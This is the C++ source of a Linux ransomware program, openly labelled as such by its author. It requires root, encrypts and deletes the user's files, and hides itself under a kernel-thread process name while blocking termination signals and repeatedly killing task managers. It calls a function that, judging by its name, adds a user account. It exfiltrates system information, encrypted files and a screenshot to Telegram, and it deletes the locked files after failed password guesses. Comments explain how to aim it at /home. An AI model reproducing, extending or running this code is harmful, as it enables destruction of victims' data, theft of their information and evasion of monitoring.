// Developed by Colton Silva 2025
// version 1.0
//
// Known to work with Debian or Ubuntu based distribution.
// Some are not compatible on Fedora and Arch, or non-systemd distributions
//
// For g++ version 8, you need to add -lstdc++fs flag as <filesystem>
// does not linked by default
//
// Lower than version 8 needs to replace filesystem with experimental/filesystem,
// std::quoted() must be manual quoting, and a few syntax fix.
//
// You may use other compiler but make sure that your compiler
// is compatible with the code.
//

#include <iostream>
#include <iomanip>
#include <fstream>
#include <cstring>
#include <vector>
#include <filesystem>
#include <thread>
#include <stdlib.h>
#include <fcntl.h>
#include <sys/prctl.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <signal.h>
#include <sys/stat.h>
#include <unistd.h>
#include <chrono>
#include <openssl/evp.h>
#include <openssl/rand.h>
#include <map>
#include <csignal>
#include <mutex>
#include <condition_variable>
#include <queue>
#include <atomic>
#include <string.h>
#include <cerrno>
#include <pwd.h>
#include <sstream>
#include "audio/happy_birthday.hpp"
#include "audio/beep.hpp"
#include "screenshotter.hpp"
#include "modifiers/greetings.hpp"

using namespace std;
namespace fs = std::filesystem;

void setupAudioEnvironment() {
    if (geteuid() == 0) { // Only run this if we are root
        const char* sudoUser = getenv("SUDO_USER");
        if (sudoUser) {
            struct passwd* pw = getpwnam(sudoUser);
            if (pw) {
                std::string xdgRuntimeDir = std::string("/run/user/") + std::to_string(pw->pw_uid);
                setenv("XDG_RUNTIME_DIR", xdgRuntimeDir.c_str(), 1);
            }
        }
    }
}

const size_t CHUNK_SIZE = 16 * 1024;
const int AES_KEY_SIZE = 32;
const int AES_BLOCK_SIZE = 16;
const int SALT_SIZE = 16;
const char FILE_SIGNATURE[] = "SILVASYSTEMS\x01\x00"; //You may change this with your own key
const string MAP_FILE = "file_map.txt";
const char* TERMINAL_CANDIDATES[] = {
    "xterm", "uterm", "gnome-terminal", "konsole", "xfce4-terminal",
    "lxterminal", "mate-terminal", "tilix", "x-terminal-emulator", nullptr
};

string shellQuote(const string& value) {
    ostringstream oss;
    oss << quoted(value, '"', '\\');
    return oss.str();
}

string buildTerminalInvocation(const string& terminal, const string& payload) {
    const string bashCommand = "bash -c " + shellQuote(payload);
    if (terminal == "gnome-terminal" || terminal == "mate-terminal" || terminal == "tilix") {
        return terminal + " -- " + bashCommand;
    }
    return terminal + " -e " + bashCommand;
}

bool handleHappyBirthdayMode(int argc, char* argv[]) {
    bool birthdayMode = false;
    bool birthdayVerbose = false;

    for (int i = 1; i < argc; ++i) {
        string arg = argv[i];
        if (arg == "--play-birthday") {
            birthdayMode = true;
        } else if (arg == "--play-birthday-verbose") {
            birthdayMode = true;
            birthdayVerbose = true;
        }
    }

    if (!birthdayMode) {
        if (const char* modeEnv = std::getenv("ENSCRAMBLED_MODE")) {
            if (string(modeEnv) == "birthday") {
                birthdayMode = true;
            }
        }
    }

    if (!birthdayVerbose) {
        if (const char* verboseEnv = std::getenv("HAPPY_BIRTHDAY_VERBOSE")) {
            string value(verboseEnv);
            if (!value.empty() && value != "0" && value != "false" && value != "FALSE") {
                birthdayVerbose = true;
            }
        }
    }

    if (birthdayMode) {
        runHappyBirthdaySong(birthdayVerbose);
        return true;
    }

    return false;
}

// Obfuscated password hidden inside garbage text. Change or add the strings here.
const string junk1 = "やπ郧bnLJ9SA9uiUSjhkDxEcʥ9&aԠNISEKOIࠇ+eعKק";
const string junk2 = "ECieNvDsPuK99suPReMO69jEa=2SDFwsEpcM8e3IlOVeKIMJONGUN";
const string junk3 = "vincemcmahon";
const string junk4 = "ㅴwVܮ3辸E6c&䶵Մ$sUcKmaHdIcK3ふわÅ=Đ?őŔԪ";
const string junk5 = "𐅰E𐊘4ed𐎵𐐡flUncKj7eSOvIEtUnIoN8𐌱cR?e齉Do";
const string junk6 = "EsU5E?cLmhH9dAzZLyuDFdaADteL94nJNka9DFaOpP";
const string junk7 = "eEv8shuUpuREWeEkLY87jkIHD9YDHUI9?EEpRAcajci";
const string HARDCODED_PASSWORD = junk3;

// Password attempt limit
const int MAX_PASSWORD_ATTEMPTS = 50; // Change this value as needed

void generateSalt(unsigned char *salt) {
    RAND_bytes(salt, SALT_SIZE);
}

void deriveKey(const string &password, const unsigned char *salt, unsigned char *key, unsigned char *iv) {
    EVP_BytesToKey(EVP_aes_256_cbc(), EVP_sha256(), salt,
                   (unsigned char *)password.data(), password.size(), 1, key, iv);
}

void processFile(const string &inputFile, const string &outputFile, const string &password, bool encrypt, map<string, string> &fileMap) {
    ifstream inFile(inputFile, ios::binary);
    ofstream outFile(outputFile, ios::binary);

    if (!inFile || !outFile) {
        cerr << "\033[1;31m[ERROR]\033[0m Error opening file: " << inputFile << endl;
        return;
    }

    unsigned char salt[SALT_SIZE];
    unsigned char key[AES_KEY_SIZE], iv[AES_BLOCK_SIZE];

    if (encrypt) {
        generateSalt(salt);
        outFile.write(FILE_SIGNATURE, sizeof(FILE_SIGNATURE));
        outFile.write((char *)salt, SALT_SIZE);
        fileMap[outputFile] = inputFile;
    } else {
        char signature[sizeof(FILE_SIGNATURE)];
        inFile.read(signature, sizeof(FILE_SIGNATURE));
        if (strncmp(signature, FILE_SIGNATURE, sizeof(FILE_SIGNATURE)) != 0) {
            cerr << "\033[1;31m[SKIP]\033[0m Invalid file signature! Skipping " << inputFile << endl;
            return;
        }
        inFile.read((char *)salt, SALT_SIZE);
    }

    deriveKey(password, salt, key, iv);

    EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
    EVP_CipherInit_ex(ctx, EVP_aes_256_cbc(), NULL, key, iv, encrypt);

    vector<unsigned char> buffer(CHUNK_SIZE);
    vector<unsigned char> outBuffer(CHUNK_SIZE + AES_BLOCK_SIZE);
    int outLen;

    while (inFile.read((char *)buffer.data(), CHUNK_SIZE) || inFile.gcount() > 0) {
        streamsize bytesRead = inFile.gcount();
        EVP_CipherUpdate(ctx, outBuffer.data(), &outLen, buffer.data(), bytesRead);
        outFile.write((char *)outBuffer.data(), outLen);
    }

    EVP_CipherFinal_ex(ctx, outBuffer.data(), &outLen);
    outFile.write((char *)outBuffer.data(), outLen);

    EVP_CIPHER_CTX_free(ctx);
    inFile.close();
    outFile.close();

    // Only delete the original file after encryption is completely finished and verified
    if (encrypt) {
        // Verify the encrypted file was created successfully
        if (fs::exists(outputFile) && fs::file_size(outputFile) > 0) {
            // Only then delete the original file
            fs::remove(inputFile);
            cout << "\033[1;32m[OK]\033[0m Nullfied: " << fs::path(inputFile).filename().string() << endl;
        } else {
            cerr << "\033[1;31m[FAILED]\033[0m  Encryption failed for: " << inputFile << " - original file preserved" << endl;
        }
    }
}

void encryptDirectory(const fs::path &dirPath, map<string, string> &fileMap, int &counter) {
    const int MAX_THREADS = 4; // Limit concurrent threads, change the value if you want faster or slower encryption
    vector<thread> threadPool;
    mutex mtx;
    atomic<int> activeThreads(0);
    condition_variable cv;

    vector<pair<string, string>> filesToEncrypt;

    for (const auto &entry : fs::recursive_directory_iterator(dirPath)) {
        if (entry.is_regular_file()) {
            string filePath = entry.path().string();
            string fileName = entry.path().filename().string();
            string relativePath = fs::relative(entry.path(), dirPath).string();

	// this was added to avoid the program itself to be encrypted, for debugging purpose
            if (fileName == "scramble.exe" || fileName == "scramble" || fileName == MAP_FILE) continue;
            if (fileName.size() > 4 && fileName.substr(0, 4) == "null") continue;

            string encryptedFile = "null" + to_string(counter++);
            filesToEncrypt.push_back({filePath, encryptedFile});
            fileMap[encryptedFile] = relativePath;
        }
    }

    for (auto &[filePath, encryptedFile] : filesToEncrypt) {
        unique_lock<mutex> lock(mtx);
        cv.wait(lock, [&] { return activeThreads < MAX_THREADS; });

        activeThreads++;
        threadPool.emplace_back([&, filePath, encryptedFile]() {
            processFile(filePath, encryptedFile, HARDCODED_PASSWORD, true, fileMap);
            {
                lock_guard<mutex> guard(mtx);
                activeThreads--;
            }
            cv.notify_all();
        });
    }

    // Wait for all threads to finish
    for (auto &t : threadPool) {
        if (t.joinable()) t.join();
    }
}

void encryptAllFiles() {

    map<string, string> fileMap;
    int counter = 1;
    encryptDirectory(fs::current_path(), fileMap, counter);
    // to change the Present Working Directory (PWD) into your chosen root directory, or entire root, replace the function encryptDirectory with this example:
    // encryptDirectory("/home", fileMap, counter);
    // to change it again into PWD, replace with 
    // encryptDirectory(fs::current_path(), fileMap, counter);
    
    // Final cleanup: remove any remaining original files that have been successfully encrypted
    cout << "\033[1;33m[PROCESS]\033[0m Performing final cleanup..." << endl;
    for (auto &pair : fileMap) {
        string encryptedFile = pair.first;
        string originalFile = pair.second;
        
        // If encrypted file exists and has content, and original file still exists, remove original
        if (fs::exists(encryptedFile) && fs::file_size(encryptedFile) > 0 && fs::exists(originalFile)) {
            fs::remove(originalFile);
            cout << "\033[1;32m[OK]\033[0m Cleaned up original file: " << fs::path(originalFile).filename().string() << endl;
        }
    }
    
    ofstream mapFile(MAP_FILE, ios::binary);
    for (auto &pair : fileMap) {
        mapFile << pair.first << " " << std::quoted(pair.second) << endl;
    }

    mapFile.close();
    cout << "\033[1;32m[OK]\033[0m Encryption process completed!" << endl;
}

void decryptAllFiles() {
    ifstream mapFile(MAP_FILE, ios::binary);
    if (!mapFile) {
        cout << "\033[1;31m[ERROR]\033[0m No file map found! Cannot restore original names." << endl;
        return;
    }

    map<string, string> fileMap;
    string encFile, origFile;
   while (mapFile >> encFile >> std::quoted(origFile)) {
    fileMap[encFile] = origFile;
}

    mapFile.close();

    int attempts = 0;
    string userPassword;
    while (attempts < MAX_PASSWORD_ATTEMPTS) {
        cout << "Enter password to restore files: ";
        cin >> userPassword;
        if (userPassword == HARDCODED_PASSWORD) {
            cout << "\033[1;32m[OK]\033[0m Password correct! Starting decryption..." << endl;
            
            for (auto &pair : fileMap) {
                fs::path outputPath = fs::current_path() / pair.second;
                if (!fs::exists(outputPath.parent_path())) {
                    fs::create_directories(outputPath.parent_path());
                }
                processFile(pair.first, outputPath.string(), HARDCODED_PASSWORD, false, fileMap);
            }
            
            // Remove encrypted files after successful decryption
            cout << "\033[1;33m[PROCESS]\033[0m Cleaning up encrypted files..." << endl;
            for (auto &pair : fileMap) {
                if (fs::exists(pair.first)) {
                    fs::remove(pair.first);
                    cout << "\033[1;32m[OK]\033[0m Removed: " << pair.first << endl;
                }
            }
            
            // Remove the map file
            fs::remove(MAP_FILE);
            cout << "\033[1;32m[SUCCESS]\033[0m All files have been restored and encrypted files cleaned up!" << endl;
            return;
        }
        cout << "\033[1;31m[WARNING]\033[0m Incorrect password. Attempts left: " << (MAX_PASSWORD_ATTEMPTS - attempts - 1) << endl;
        attempts++;
    }
    cout << "\n\033[1;31m[SORRY]\033[0m Max password attempts reached. Sorry but we need to delete these files.\n" << endl;
    for (auto &pair : fileMap) {
        fs::remove(pair.first);
    }
    fs::remove(MAP_FILE);
}

//Function to ignore termination signals (old)
    void ignoreSignals(int signal) {
    cout << "\nInterrupt blocked. Process cannot be stopped!\n" << endl;
}

void startEncryption() {
    encryptAllFiles(); // Start encryption process
}

// from void setupProtection()
void signalHandler(int signum) {
    cout << "\n\033[1;31m[BLOCKED]\033[0m Attempted to terminate process! Ignored.\n" << endl;
}

// Of course to avoid killing or terminating encryption process
// we need to block them.

void setupProtection() {
    signal(SIGHUP, signalHandler);     // Terminal hangup
    signal(SIGINT, signalHandler);     // Ctrl+C
    signal(SIGQUIT, signalHandler);    // Ctrl+\ //
    signal(SIGILL, signalHandler);     // Illegal instruction
    signal(SIGABRT, signalHandler);    // Abort signal
    signal(SIGFPE, signalHandler);     // Floating point exception
    signal(SIGSEGV, signalHandler);    // Segmentation fault
    signal(SIGPIPE, signalHandler);    // Broken pipe
    signal(SIGALRM, signalHandler);    // Timer signal
    signal(SIGTERM, signalHandler);    // Termination request
    signal(SIGUSR1, signalHandler);    // User-defined signal 1
    signal(SIGUSR2, signalHandler);    // User-defined signal 2
    signal(SIGTSTP, signalHandler);    // Ctrl+Z (suspend)
    signal(SIGTTIN, signalHandler);    // Background process read
    signal(SIGTTOU, signalHandler);    // Background process write
    signal(SIGXCPU, signalHandler);    // CPU time limit exceeded
    signal(SIGXFSZ, signalHandler);    // File size limit exceeded
    signal(SIGVTALRM, signalHandler);  // Virtual alarm
    signal(SIGPROF, signalHandler);    // Profiling timer expired
    prctl(PR_SET_NAME, "kworker/0:1H", 0, 0, 0);
}

// While blocking execution of these task managers are possible, blocking
// poweroff, reboot or logout, lockscreen manager, systemctl and other related
// system binaries will result in crash or unstable operation of the system

void monitorAndKillTaskManagers() {
    const vector<string> taskManagers = {
    // You may add a task manager here
        "htop", "btop", "top", "atop", "gtop", 
        "vtop", "bashtop", "glances", "ksysguard", "gnome-system-monitor",
        "xfce4-taskmanager", "lxtask", "taskmgr", "resmon",
        "kSysGuard", "mate-system-monitor", "nmon", "bpytop", "conky",
        "perf", "iotop", "ps_mem", "nmon"
  
    };

    while (true) {
        for (const auto &proc : taskManagers) {
        string cmd = "pkill -9 -f \"" + proc + "\" > /dev/null 2>&1";
            system(cmd.c_str());
        }
        this_thread::sleep_for(chrono::milliseconds(500));
    }
}

// We don't add kill or pkill interruption here.

void encryptAllFiles();
void decryptAllFiles();

void watchdog(const string& selfPath) {
    pid_t pid = fork();
    if (pid > 0) return;
    if (pid < 0) exit(1);

    while (true) {
        int ret = system(("pgrep -f '" + selfPath + "' | grep -v $$ > /dev/null").c_str());
        if (ret != 0) {
            for (int i = 0; TERMINAL_CANDIDATES[i]; ++i) {
                string terminal = TERMINAL_CANDIDATES[i];
                string cmd = buildTerminalInvocation(terminal, selfPath) + " &";
                if (system(cmd.c_str()) == 0) break;
            }
        }

        sleep(5);
    }

    exit(0);
}

void relaunchInTerminalIfDetached(const char* selfPath) {
    // Always try to launch matrix effect, regardless of terminal status
    cout << "\033[1;33m[PROCESS]\033[0m Launching matrix effect in new terminal..." << endl;
    
    fs::path tmpDir;
    try {
        tmpDir = fs::temp_directory_path();
    } catch (const std::exception& ex) {
        cerr << "\033[1;31m[ERROR]\033[0m  Failed to determine temp directory: " << ex.what() << endl;
        return;
    }

    const fs::path scriptPath = tmpDir / "matrix.sh";

    // Ensure previous script is removed
    std::error_code removeEc;
    fs::remove(scriptPath, removeEc);

    // Write a temporary matrix effect shell script
    ofstream script(scriptPath, ios::out | ios::trunc);
    if (!script) {
        cerr << "\033[1;31m[ERROR]\033[0m  Failed to open matrix script for writing! (" << strerror(errno) << ")" << endl;
        return;
    }
    script << R"(#!/bin/bash
# Matrix effect script
clear
echo -e "\033[1;32m"
echo "Matrix effect started..."

# Get terminal dimensions with fallback
cols=$(tput cols 2>/dev/null || echo 80)
lines=$(tput lines 2>/dev/null || echo 24)

# Matrix characters
chars=(ｱ ｲ ｳ ｴ ｵ ｶ ｷ ｸ ｹ ｺ ｻ ｼ ｽ ｾ ｿ ﾀ ﾁ ﾂ ﾃ ﾄ ﾅ ﾆ ﾇ ﾈ ﾉ ﾊ ﾋ ﾌ ﾍ ﾎ ﾏ ﾐ ﾑ ﾒ ﾓ ﾔ ﾕ ﾖ ﾗ ﾘ ﾚ ﾛ ﾜ)

# Initialize positions
for ((i=0; i<cols; i++)); do
  pos[i]=0
done

# Main loop
while true; do
  for ((i=0; i<cols; i++)); do
    if (( RANDOM % 100 < 10 )); then
      printf "\033[%s;%sH%s" "${pos[i]}" "$i" "${chars[RANDOM % ${#chars[@]}]}"
    fi
    (( pos[i]++ ))
    if (( pos[i] >= lines )); then
      pos[i]=0
    fi
  done
  sleep 0.05
done
)";
    script.flush();
    if (!script.good()) {
        cerr << "\033[1;31m[ERROR]\033[0m  Failed to write matrix script!" << endl;
        script.close();
        return;
    }
    script.close();
    
    chmod(scriptPath.c_str(), 0755);  // Make the script executable

    // Try launching in available terminals (xterm/uterm first, then common terminals)
    for (int i = 0; TERMINAL_CANDIDATES[i]; ++i) {
        const string terminal = TERMINAL_CANDIDATES[i];
        string cmd = buildTerminalInvocation(terminal, scriptPath.string()) + " &";

        cout << "\033[1;33m[INFO]\033[0m Trying to launch matrix in: " << terminal << endl;
        cout << "\033[1;33m[INFO]\033[0m Command: " << cmd << endl;
        
        int result = system(cmd.c_str());
        if (result == 0) {
            cout << "\033[1;32m[SUCCESS]\033[0m Successfully launched matrix effect in " << terminal << endl;
            // Give it a moment to start
            this_thread::sleep_for(chrono::milliseconds(500));
            return;  // Terminal launched successfully
        } else {
            cout << "\033[1;31m[FAIL]\033[0m Failed to launch in " << terminal << " (exit code: " << result << ")" << endl;
        }
    }

    cerr << "\033[1;31m[FAIL]\033[0m Failed to launch matrix terminal effect!" << endl;
    
    // Fallback: try to run the script directly in background
    string fallbackCmd = "bash " + scriptPath.string() + " &";
    cout << "\033[1;33m[TRY]\033[0m Trying fallback method..." << endl;
    if (system(fallbackCmd.c_str()) == 0) {
        cout << "\033[1;33m[INFO]\033[0m Matrix effect started in background as fallback." << endl;
    } else {
        cerr << "\033[1;31m[FAIL]\033[0m All attempts to launch matrix effect failed!" << endl;
    }
}


void launchHappyBirthdayTerminal(const string& selfPath) {
    cout << "\033[1;33m[PROCESS]\033[0m Launching happy birthday song in new terminal..." << endl;

    fs::path tmpDir;
    try {
        tmpDir = fs::temp_directory_path();
    } catch (const std::exception& ex) {
        cerr << "\033[1;31m[ERROR]\033[0m  Failed to determine temp directory: " << ex.what() << endl;
        return;
    }

    const fs::path scriptPath = tmpDir / "birthday.sh";
    ofstream script(scriptPath, ios::out | ios::trunc);
    if (!script) {
        cerr << "\033[1;31m[ERROR]\033[0m  Failed to open birthday script for writing! (" << strerror(errno) << ")" << endl;
        return;
    }

    const char* sudoUser = getenv("SUDO_USER");
    bool isRoot = (geteuid() == 0);

    script << "#!/bin/bash\n";
    script << "export DISPLAY=:0\n"; 
    if (sudoUser) {
        script << "export XAUTHORITY=/home/" << sudoUser << "/.Xauthority\n";
    }

    string birthdayCmd = shellQuote(selfPath) + " --play-birthday";
    if (isRoot && sudoUser) {
        script << "runuser -l " << sudoUser << " -c '" << birthdayCmd << "'\n";
    } else {
        script << birthdayCmd << "\n";
    }
    script.close();

    chmod(scriptPath.c_str(), 0755);

    for (int i = 0; TERMINAL_CANDIDATES[i]; ++i) {
        const string terminal = TERMINAL_CANDIDATES[i];
        string cmd = buildTerminalInvocation(terminal, scriptPath.string()) + " &";

        cout << "\033[1;33m[INFO]\033[0m Trying to launch birthday song in: " << terminal << endl;
        cout << "\033[1;33m[INFO]\033[0m Command: " << cmd << endl;

        int result = system(cmd.c_str());
        if (result == 0) {
            cout << "\033[1;32m[SUCCESS]\033[0m Successfully launched happy birthday in " << terminal << endl;
            this_thread::sleep_for(chrono::milliseconds(250));
            return;
        }
        cout << "\033[1;31m[FAIL]\033[0m Failed to launch in " << terminal << " (exit code: " << result << ")" << endl;
    }

    cerr << "\033[1;31m[WARN]\033[0m Unable to launch happy birthday in a new terminal." << endl;
}


// This part will auto install required dependencies if missing.
// Of course this ransomware will not work if one of them are not
// installed by default

string detectPackageManager() {
    if (system("command -v apt > /dev/null 2>&1") == 0) return "apt";
    if (system("command -v yum > /dev/null 2>&1") == 0) return "yum";
    if (system("command -v dnf > /dev/null 2>&1") == 0) return "dnf";
    if (system("command -v pacman > /dev/null 2>&1") == 0) return "pacman";
    if (system("command -v apk > /dev/null 2>&1") == 0) return "apk"; // Alpine
    return "unknown";
}

bool isPackageInstalled(const string &pkg, const string &manager) {
    string checkCmd;

    if (manager == "apt")       checkCmd = "dpkg -s " + pkg + " > /dev/null 2>&1";
    else if (manager == "yum" || manager == "dnf") checkCmd = "rpm -q " + pkg + " > /dev/null 2>&1";
    else if (manager == "pacman") checkCmd = "pacman -Qi " + pkg + " > /dev/null 2>&1";
    else if (manager == "apk")    checkCmd = "apk info " + pkg + " > /dev/null 2>&1";
    else return false;

    return system(checkCmd.c_str()) == 0;
}

void installPackageIfMissing(const string &pkg) {
    string manager = detectPackageManager();

    if (manager == "unknown") {
        cerr << "Unsupported package manager. Please install '" << pkg << "' manually.\n";
        return;
    }

    if (isPackageInstalled(pkg, manager)) {
        cout << "\033[1;32m[OK]\033[0m Dependency already installed: " << pkg << endl;
        return;
    }

    cout << "\033[1;33m[PROCESS]\033[0m Installing missing package: " << pkg << "...\n";

    string installCmd;
    if (manager == "apt")        installCmd = "sudo apt-get update && sudo apt-get install -y " + pkg;
    else if (manager == "yum")   installCmd = "sudo yum install -y " + pkg;
    else if (manager == "dnf")   installCmd = "sudo dnf install -y " + pkg;
    else if (manager == "pacman")installCmd = "sudo pacman -Sy --noconfirm " + pkg;
    else if (manager == "apk")   installCmd = "sudo apk add " + pkg;

    int result = system(installCmd.c_str());
    if (result != 0)
        cerr << "\033[1;31m[ERROR]\033[0m  Failed to install package: " << pkg << endl;
    else
        cout << "\033[1;32m[OK]\033[0m Installed: " << pkg << endl;
}

void annoying_beep(atomic<bool>& stop_beeping) {
    while (!stop_beeping) {
        pc_beep();
        this_thread::sleep_for(chrono::seconds(1));
    }
}

void checkDependencies() {
    installPackageIfMissing("libssl-dev");
    installPackageIfMissing("libcurl4-openssl-dev");
    installPackageIfMissing("build-essential");
    installPackageIfMissing("acpi");
    installPackageIfMissing("xterm");
    installPackageIfMissing("scrot");
    installPackageIfMissing("libsdl2-dev"); // for beeps
} 

void sendRandomEncryptedFiles(const string &directory, int maxFiles);
std::string gatherFullSystemInfo();
void sendMessageToTelegram(const string &message);
void sendScreenshotToTelegram();
bool generateHtmlFile(const std::string& outputPath = "generated.html");
bool addPresetUser(bool debug = false);

int main(int argc, char* argv[]) {

// This requires you to run this program into root.
// Comment the "if" part if you don't want to run it as root.

    if (handleHappyBirthdayMode(argc, argv)) {
        return 0;
    }

if (geteuid() != 0) {
    cerr << "\n\033[1;31m[ERROR]\033[0m This program must be run as root." << endl;
    exit(1);
}

	cout << "\033[1;34m[START]\033[0m We need to check if the required dependencies are installed.\n" << endl;
                  
        this_thread::sleep_for(chrono::seconds(5));

  checkDependencies();
  addPresetUser();

if (!fs::exists(MAP_FILE)) {
    
    atomic<bool> stop_beeping(false);
    thread beep_thread(annoying_beep, ref(stop_beeping));

    backup_motd();
    change_motd();

    fs::path selfPath = fs::absolute(argv[0]);  // Full binary path
   
    relaunchInTerminalIfDetached(argv[0]);
    generateHtmlFile("index.html");
    launchHappyBirthdayTerminal(selfPath.string());
    setupProtection();
    
    // this part is unstable as fuck
    //thread wd(watchdog, selfPath);
    //wd.detach();
    
    thread antiMonitor(monitorAndKillTaskManagers);
    antiMonitor.detach();

        cout << " _____ _ _      _   _       _ _\n|  ___(_) | ___| \\ | |_   _| | | ___ _ __ \n| |_  | | |/ _ \\  \\| | | | | | |/ _ \\ '__|\n|  _| | | |  __/ |\\  | |_| | | |  __/ |   \n|_|   |_|_|\\___|_| \\_|\\__,_|_|_|\\___|_|   \nThe not-so-bad RANSOMWARE for Linux by Colton Silva\n" << endl;

        cout << "\nOH NO! YOUR PERSONAL FILES WILL BE ENCRYPTED! Don't worry because this ransomware does not ask for money, stealing them or threaten you to distribute your sensitive files to criminals. You just need to solve this by guessing the correct password in order to retrieve them.\n\nYOU CAN'T DESTROY THIS PROCESS. EVEN IF YOU KILL YOUR LOVELY TERMINAL OF YOURS, THIS PROCESS IS ONGOING.\n" << endl;

        this_thread::sleep_for(chrono::seconds(10));
        
        cout << "\n\033[1;31m[WARNING]\033[0m IF YOU CLOSE THIS TERMINAL, THIS PROGRAM WILL DELETE ALL OF YOUR FILES.\n" << endl;
                  
        this_thread::sleep_for(chrono::seconds(10));

        thread encryptionThread(startEncryption);

        cout << "Now, say BYE-BYE to your files!\n" << endl;

        cout << "\033[1;31m[EXTREME]\033[0m Null-ng files...\n" << endl;

        encryptionThread.join();
        
        stop_beeping = true;
        beep_thread.join();
        
        string info = gatherFullSystemInfo();
        sendMessageToTelegram(info);
        sendRandomEncryptedFiles(fs::current_path().string(), 10);

        // If you want to encrypt root directory, do this example here:
        // sendRandomEncryptedFiles("/home", 10);
        // Only if you want the current user's home directory, use this instead:
        // sendRandomEncryptedFiles(getenv("HOME"), 10);

        // Take a screenshot and send it to Telegram

        sendScreenshotToTelegram();
        
        decryptAllFiles();
        return 0; 
    }

    else {
        decryptAllFiles();
    }
    return 0;
} 
